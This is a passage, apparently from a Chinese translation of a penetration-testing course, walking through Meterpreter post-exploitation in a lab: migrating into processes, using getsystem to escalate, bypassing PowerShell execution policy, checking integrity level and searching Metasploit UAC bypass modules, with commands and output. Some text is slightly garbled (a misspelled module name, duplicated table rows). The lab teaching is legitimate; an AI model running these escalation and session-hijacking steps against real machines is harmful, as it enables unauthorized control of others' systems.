
Process 2720 created.

[+] Migrating from 8052 to 2720...

[+] Migration completed successfully.

```
meterpreter >
```

## 列表 681 - 迁移到新生成的进程
列表 681 显示了如何迁移到新生成的 Notepad 进程。由于我们使用了 `-H` 选项，Notepad 进程在生成时没有任何视觉显示。然而，它仍然列在应用程序的进程列表中。

本节结束。我们探索了 Meterpreter 的几项后渗透功能。首先，我们使用 `idletime` 检查用户是否正在目标系统上操作；接着我们使用 `getsystem` 命令提升权限，并使用 `migrate` 将 Meterpreter 有效负载的执行转移到不同的进程。

> Meterpreter 提供了许多有趣的后渗透模块，例如 `hasdump`（转储 SAM 数据库的内容）或 `screenshare`（实时显示目标机器的桌面）。

### 20.3.2 后渗透利用模块

除了 Meterpreter 核心功能中的原生命令和操作外，我们还有可以部署到活动会话中的几个后渗透模块。

通过执行客户端攻击等攻击向量创建的会话可能只为我们提供低权限。但如果目标用户是本地管理员组的成员，只要我们能够绕过用户账户控制 `UAC`，我们就可以提升自己的高完整性级别。³⁹

在上一节中，我们将 Meterpreter 迁移到了正在运行（推测为中完整性）的 `OneDrive.exe` 进程。对于会话，让我们重复上一个会话的步骤，然后使用 Metasploit 后渗透模块绕过 UAC，以在高完整性进程的文中获取会话。

与之前一样，为了在 ITWK01 的端口 `4444` 上绑定 shell，下载并执行 `met.exe`，然后输入 `getsystem` 来提升我们的权限。然后我们使用 `ps` 来识别 `OneDrive.exe` 的权限 ID，并迁移到那里。

```
meterpreter > getsystem
...got system technique 5 (Named Pipe Impersonation PrintSpooler variant)).
meterpreter > ps
```

#### 进程列表

| PID | Name | Arch | Session | User | Path |
| --- | --- | --- | --- | --- | --- |
| 8044 | 3912 OneDrive.exe | x64 | 1 | ITWK01:offsec | C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe |

```
meterpreter > migrate 8044
[*] Migrating from 9020 to ...8044...
[*] Migration completed successfully.
```

```
meterpreter > getuid
Server username: ITWK01\offsec
```

Listing 682 - Migrate to OneDrive process of the user offsec

列表 682 显示我们现在再次在 offsec 的上下文中运行。虽然这是一个管理员账户，但正如我们在之前的模块中学会的那样，UAC 阻止了我们执行管理操作。在尝试绕过 UAC 之前，让我们确认当前进程的完整性级别为中等（Medium）。

> ³⁹（微软文档, 2022）， https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-controls

要显示进程的完整性级别，我们可以使用 Process Explorer^994 或第三方 PowerShell 模块如 NtObjectManager^995。假设后者已安装在系统中。

一旦使用 `Import-Module`^996 导入模块，我们就可以使用 `Get-NttokenIntegrityLevel`^997 通过检索和检查分配的令牌来显示当前进程的完整性级别。

```
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.2200.795]
(c) Microsoft Corporation. All rights reserved.
```

```
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
(c) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements:
https://aka.ms/PSWindows
```
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
```

```
PS C:\Windows\system32> Get-NttokenIntegrityLevel
Get-NttokenIntegrityLevel
Medium
```

> 列表 683 - 检查完整性级别

列表 683 显示我们目前在中等完整性上下文中执行操作。

接下来，让我们将当前活动的通道放入后台，并搜索和利用 UAC 后渗透模块。

```
PS C:\Windows\system32> ^Z
Background channel 1? [y/N] y
```

```
meterpreter > bg
[*] Background session 9...
```

> 列表 684 - 后台通道和会话

现在让我们搜索 UAC 绕过模块。

^994（微软文档, 2022），https://docs.microsoft.com/en-us/internals/downloads/process-explorer

^995（PowerShell Gallery, 2022），https://www.powershellgallery.com/packages/NtObjectManager/1/1.33

^996（微软文档, 2022），https://docs.microsoft.com/en-us/powershell/powershell.core/import-module#view-powershell-7-2

^997（Github, 2021），https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/NttokenIntegrityFunctions.ps1

`msf6 exploit(multi/handler) > search UAC`

匹配的模块

| 名称 | 发布日期 | 排名 | 描述 |
| --- | --- | --- | --- |
| post/windows/sticky_keys | | normal | Check |
| exploit/windows/local/cve_2022_26904_silentcleanup | 2022-03-17 | excellent | 任意权限提升 |
| exploit/windows/local/bypass_windows_store | 2019-08-22 | manual | Windows 10 UAC 绕过 (WSReset.exe) |
| exploit/windows/local/bypass_windows_store_reg | 2019-02-19 | manual | Windows 10 UAC 绕过 (注册表) |
| post/windows/sticky_keys | | normal | Check |
| exploit/windows/local/bypass_windows_store | 2019-08-22 | manual | Windows 10 UAC 绕过 (WSReset.exe) |
| exploit/windows/local/bypass_windows_store_reg | 2019-02-19 | manual | Windows 10 UAC 绕过 (注册表) |
| exploit/windows/local/cve_2022_26904_silentcleanup | 2022-03-17 | excellent | 任意权限提升 |
